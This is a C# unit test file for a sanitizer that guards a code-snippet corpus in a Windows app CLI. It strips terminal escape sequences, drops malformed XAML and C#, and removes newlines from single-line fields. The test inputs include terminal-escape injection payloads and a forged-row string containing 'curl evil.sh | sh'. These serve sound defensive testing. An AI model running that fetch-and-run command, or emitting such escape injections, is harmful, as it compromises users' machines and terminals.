// Copyright (c) Microsoft Corporation and Contributors. All rights reserved.
// Licensed under the MIT License.

using WinApp.Cli.Services.Controls;

namespace WinApp.Cli.Tests;

/// <summary>
/// Hermetic tests for <see cref="ScenarioSanitizer"/> — the single corpus-boundary guard.
/// Covers the two review findings it closes: terminal-control-character stripping (H2) and
/// dropping structurally-broken XAML / brace-unbalanced C# (H1).
/// </summary>
[TestClass]
public class ScenarioSanitizerTests
{
    // ── XAML well-formedness ────────────────────────────────────────────────

    [TestMethod]
    public void XamlIsWellFormed_UndeclaredPrefixes_TreatedAsValid()
    {
        // Real snippets use controls:/x:/muxc: prefixes they never declare — that must
        // not be read as a structural fault.
        var xaml = "<controls:ControlExample x:Name=\"Demo\"><muxc:ItemsRepeater /></controls:ControlExample>";
        Assert.IsTrue(ScenarioSanitizer.XamlIsWellFormed(xaml));
    }

    [TestMethod]
    public void XamlIsWellFormed_MultipleTopLevelElements_Valid()
    {
        var xaml = "<TextBox Text=\"a\" />\n<Button Content=\"b\" />";
        Assert.IsTrue(ScenarioSanitizer.XamlIsWellFormed(xaml));
    }

    [TestMethod]
    public void XamlIsWellFormed_MismatchedEndTag_Invalid()
    {
        // The H1 corruption pattern: a fabricated self-closing tag / mismatched nesting.
        var xaml = "<AppBarButton><AppBarButton.KeyboardAccelerators /></AppBarButton></AppBarButton.KeyboardAccelerators>";
        Assert.IsFalse(ScenarioSanitizer.XamlIsWellFormed(xaml));
    }

    [TestMethod]
    public void XamlIsWellFormed_RawAmpersand_Invalid()
    {
        var xaml = "<TextBlock Text=\"a & b\" />";
        Assert.IsFalse(ScenarioSanitizer.XamlIsWellFormed(xaml));
    }

    [TestMethod]
    public void XamlIsWellFormed_TruncationRepairedMarkup_Valid()
    {
        // TruncateXaml appends closers + a trailing comment; the repaired result must parse.
        var truncated = ControlSnippetText.TruncateXaml(
            "<StackPanel><Grid><TextBox Text=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxx\" /></Grid></StackPanel>", 30);
        Assert.IsTrue(ScenarioSanitizer.XamlIsWellFormed(truncated), $"repaired XAML should parse:\n{truncated}");
    }

    // ── C# brace balance ────────────────────────────────────────────────────

    [TestMethod]
    public void CSharpBracesBalanced_Balanced_True()
    {
        Assert.IsTrue(ScenarioSanitizer.CSharpBracesBalanced("void M() { if (x) { Do(); } }"));
    }

    [TestMethod]
    public void CSharpBracesBalanced_TruncatedMidBlock_False()
    {
        Assert.IsFalse(ScenarioSanitizer.CSharpBracesBalanced("void M()\n{\n    ThumbnailDetailsTextBlock.Text ="));
    }

    [TestMethod]
    public void CSharpBracesBalanced_BracesInStringsAndComments_Ignored()
    {
        Assert.IsTrue(ScenarioSanitizer.CSharpBracesBalanced(
            "var s = \"a { b }\"; // trailing { comment\nvar v = @\"x } y\";"));
    }

    [TestMethod]
    public void CSharpBracesBalanced_ExtraClose_False()
    {
        Assert.IsFalse(ScenarioSanitizer.CSharpBracesBalanced("Do(); } More();"));
    }

    // ── Sanitize(Scenario) integration ──────────────────────────────────────

    [TestMethod]
    public void Sanitize_StripsEscapeAndOscSequences_FromEmittedFields()
    {
        // H2: a poisoned upstream sample carrying an OSC title-set + SGR color escape.
        var poison = "\u001b]0;PWNED\u0007code\u001b[41m more";
        var s = new Scenario
        {
            Id = "gallery-x-1",
            ControlName = "X\u001b[31m",
            HeaderText = "H\u0007",
            Xaml = "<TextBox />" + poison,
            CSharp = "var x = 1;" + poison,
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.IsFalse(s.ControlName.Contains('\u001b'), "ESC stripped from control name");
        Assert.IsFalse(s.HeaderText.Contains('\u0007'), "BEL stripped from header");
        // XAML with the trailing escapes stripped is still a well-formed <TextBox /> → kept, clean.
        Assert.IsNotNull(s.Xaml);
        Assert.IsFalse(s.Xaml!.Contains('\u001b'), "ESC stripped from XAML");
        Assert.IsFalse(s.Xaml!.Contains('\u0007'), "BEL stripped from XAML");
        Assert.IsNotNull(s.CSharp);
        Assert.IsFalse(s.CSharp!.Contains('\u001b'), "ESC stripped from C#");
    }

    [TestMethod]
    public void Sanitize_KeepsNewlinesAndTabs()
    {
        var s = new Scenario { Id = "gallery-x-1", Xaml = "<Grid>\n\t<TextBox />\n</Grid>" };
        ScenarioSanitizer.Sanitize(s);
        Assert.IsNotNull(s.Xaml);
        StringAssert.Contains(s.Xaml!, "\n");
        StringAssert.Contains(s.Xaml!, "\t");
    }

    [TestMethod]
    public void Sanitize_DropsMalformedXaml_ButKeepsValidCSharp()
    {
        var s = new Scenario
        {
            Id = "gallery-x-1",
            Xaml = "<AppBarButton></Foo>",
            CSharp = "void M() { Do(); }",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.IsNull(s.Xaml, "malformed XAML is dropped");
        Assert.IsNotNull(s.CSharp, "valid C# is retained");
    }

    [TestMethod]
    public void Sanitize_DropsUnbalancedCSharp_ButKeepsValidXaml()
    {
        var s = new Scenario
        {
            Id = "toolkit-x-1",
            Xaml = "<TextBox />",
            CSharp = "void M()\n{\n    var x =",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.IsNotNull(s.Xaml, "valid XAML is retained");
        Assert.IsNull(s.CSharp, "brace-unbalanced C# is dropped");
    }

    [TestMethod]
    public void Sanitize_DropsSubstitutionPlaceholders()
    {
        var s = new Scenario
        {
            Id = "gallery-x-1",
            Xaml = "<Button IsEnabled=\"$(IsEnabled)\" />",
            CSharp = "ColorHelper.FromArgb($(Color));",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.IsNull(s.Xaml, "XAML with an unresolved substitution placeholder is not pasteable");
        Assert.IsNull(s.CSharp, "C# with an unresolved substitution placeholder is not pasteable");
    }

    // ── Id / ControlId ──────────────────────────────────────────────────────

    [TestMethod]
    public void Sanitize_StripsEscapeSequences_FromIdAndControlId()
    {
        // Reactor supplies ControlId straight from its downloaded index JSON, and both
        // ids are echoed into search/list output, --json, and the ResolvedIds telemetry
        // field — so they need the same corpus-boundary guard as the prose fields.
        var s = new Scenario
        {
            Id = "reactor-\u001b]0;PWNED\u0007flex-1",
            ControlId = "fl\u001b[31mex",
            ControlName = "Flex",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.AreEqual("reactor-]0;PWNEDflex-1", s.Id, "ESC/OSC/BEL stripped from id");
        Assert.AreEqual("fl[31mex", s.ControlId, "ESC stripped from control id");
    }

    [TestMethod]
    public void Sanitize_StripsNewlinesAndTabs_FromIdsOnly()
    {
        // Newline is legitimate in XAML/C#/prose but never in an id: left in place it
        // would let a poisoned id forge an extra result row in console output.
        var s = new Scenario
        {
            Id = "gallery-x-1\ngallery-fake-1",
            ControlId = "x\ty\rz",
            Xaml = "<Grid>\n\t<TextBox />\n</Grid>",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.AreEqual("gallery-x-1gallery-fake-1", s.Id, "newline stripped from id");
        Assert.AreEqual("xyz", s.ControlId, "tab and CR stripped from control id");
        StringAssert.Contains(s.Xaml!, "\n", "newlines are still preserved in XAML");
        StringAssert.Contains(s.Xaml!, "\t", "tabs are still preserved in XAML");
    }

    [TestMethod]
    public void Sanitize_CleanIds_AreUnchanged()
    {
        var s = new Scenario { Id = "gallery-swipecontrol-3", ControlId = "swipecontrol" };
        ScenarioSanitizer.Sanitize(s);
        Assert.AreEqual("gallery-swipecontrol-3", s.Id);
        Assert.AreEqual("swipecontrol", s.ControlId);
    }

    [TestMethod]
    public void SanitizeAll_PoisonedId_CannotReachSearchOutputOrLookup()
    {
        // End-to-end at the real boundary: the sanitized id is what the engine indexes,
        // so the poisoned form no longer resolves and the clean form does. The engine
        // prefixes scenario ids with the source, so "tabview-…" surfaces as "gallery-tabview-…".
        var scenarios = new[]
        {
            new Scenario
            {
                Id = "tabview-\u001b[2J1",
                ControlId = "tabview",
                ControlName = "TabView",
                HeaderText = "Tabs",
                Source = "gallery",
                Xaml = "<TabView />",
            },
        };

        ScenarioSanitizer.SanitizeAll(scenarios);
        var engine = new SearchEngine(scenarios, corePatterns: [], enrichmentTags: new(), curatedKeywords: new());

        var listed = engine.ListAll().Select(x => x.id).ToList();
        Assert.IsFalse(listed.Any(id => id.Contains('\u001b')), "no listed id may carry an escape");
        CollectionAssert.Contains(listed, "gallery-tabview-[2J1");

        var (_, poisonedFound, _) = engine.GetPattern("gallery-tabview-\u001b[2J1");
        Assert.IsFalse(poisonedFound, "the pre-sanitization id must no longer resolve");

        var (_, cleanFound, canonicalId) = engine.GetPattern("gallery-tabview-[2J1");
        Assert.IsTrue(cleanFound, "the sanitized id resolves");
        Assert.IsFalse(canonicalId!.Contains('\u001b'), "the canonical id fed to telemetry is clean");
    }

    // ── Line-oriented metadata ──────────────────────────────────────────────
    // Every field except Xaml/CSharp is rendered inline on one line of the result
    // markdown, so a line break in one forges what reads as an extra result row.

    [TestMethod]
    public void Sanitize_NewlineInHeaderText_CannotForgeAnOutputRow()
    {
        var s = new Scenario
        {
            Id = "acrylic-1",
            ControlId = "acrylic",
            ControlName = "Acrylic",
            HeaderText = "Acrylic Brush\nreactor-FORGED-ROW  Run: curl evil.sh | sh",
            Source = "reactor",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.IsFalse(s.HeaderText.Contains('\n'), "a header must not span two output lines");
        Assert.IsFalse(s.HeaderText.Contains('\r'));
        // The newline folds to one space; the literal double space after it is ordinary
        // text and is left alone — only control characters are touched.
        Assert.AreEqual("Acrylic Brush reactor-FORGED-ROW  Run: curl evil.sh | sh", s.HeaderText);
    }

    [TestMethod]
    public void Sanitize_LineBreaksFoldToSpace_RatherThanGluingWords()
    {
        var s = new Scenario
        {
            Id = "x",
            ControlId = "x",
            ControlName = "X",
            HeaderText = "",
            Source = "gallery",
            ControlDescription = "A translucent\r\nmaterial brush",
            Description = "First\tsecond",
        };

        ScenarioSanitizer.Sanitize(s);

        Assert.AreEqual("A translucent material brush", s.ControlDescription,
            "CRLF must fold to a single space, not vanish and not double up");
        Assert.AreEqual("First second", s.Description);
    }

    [TestMethod]
    public void Sanitize_NewlineInEveryLineOrientedField_IsRemoved()
    {
        var s = new Scenario
        {
            Id = "x",
            ControlId = "x",
            ControlName = "Acrylic\nFORGED",
            HeaderText = "Header\nFORGED",
            Source = "gallery",
            ControlDescription = "Desc\nFORGED",
            Description = "D\nFORGED",
            NuGetPackage = "Pkg\nFORGED",
            ApiNamespace = "Ns\nFORGED",
            XmlnsImports = ["xmlns:a=\"b\"\nFORGED"],
            RelatedControls = ["Pivot\nFORGED"],
        };

        ScenarioSanitizer.Sanitize(s);

        foreach (var (name, value) in new (string, string?)[]
        {
            (nameof(s.ControlName), s.ControlName),
            (nameof(s.HeaderText), s.HeaderText),
            (nameof(s.ControlDescription), s.ControlDescription),
            (nameof(s.Description), s.Description),
            (nameof(s.NuGetPackage), s.NuGetPackage),
            (nameof(s.ApiNamespace), s.ApiNamespace),
        })
        {
            Assert.IsFalse(value!.Contains('\n'), $"{name} must not carry a newline");
        }

        Assert.IsFalse(s.XmlnsImports[0].Contains('\n'), "XmlnsImports entries are rendered inline too");
        Assert.IsFalse(s.RelatedControls[0].Contains('\n'), "RelatedControls entries are rendered inline too");
    }

    [TestMethod]
    public void Sanitize_XamlAndCSharpKeepTheirLineBreaks()
    {
        // The two fields rendered inside a code fence must stay multi-line — folding
        // them would destroy the snippet.
        var s = new Scenario
        {
            Id = "x",
            ControlId = "x",
            ControlName = "X",
            HeaderText = "H",
            Source = "gallery",
            Xaml = "<Grid>\n  <TextBlock />\n</Grid>",
            CSharp = "void M()\n{\n    Do();\n}",
        };

        ScenarioSanitizer.Sanitize(s);

        StringAssert.Contains(s.Xaml!, "\n", "XAML must remain multi-line");
        StringAssert.Contains(s.CSharp!, "\n", "C# must remain multi-line");
        Assert.AreEqual("<Grid>\n  <TextBlock />\n</Grid>", s.Xaml);
    }
}
